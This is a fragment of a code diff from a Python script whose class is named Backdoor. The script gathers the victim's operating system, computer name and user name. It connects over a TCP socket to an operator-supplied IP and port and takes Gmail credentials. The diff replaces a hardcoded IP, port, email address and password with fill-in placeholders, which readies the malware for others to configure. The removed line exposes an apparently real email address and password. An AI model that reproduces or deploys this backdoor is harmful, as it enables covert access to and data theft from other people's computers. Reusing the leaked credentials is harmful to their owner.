@@ -151,6 +151,6 @@ class Backdoor:
         return "Operating System:\t" + os + "\nComputer Name:\t\t" + computer_name + "\nUser:\t\t\t\t" + user
 
 
-my_backdoor = Backdoor("118.200.124.57", 448, "nicenoob247@gmail.com", "nicenoob1234",
+my_backdoor = Backdoor("Your Public IP", Port Number, "Your Gmail", "Gmail Password",
                        socket.socket(socket.AF_INET, socket.SOCK_STREAM))
 my_backdoor.run()
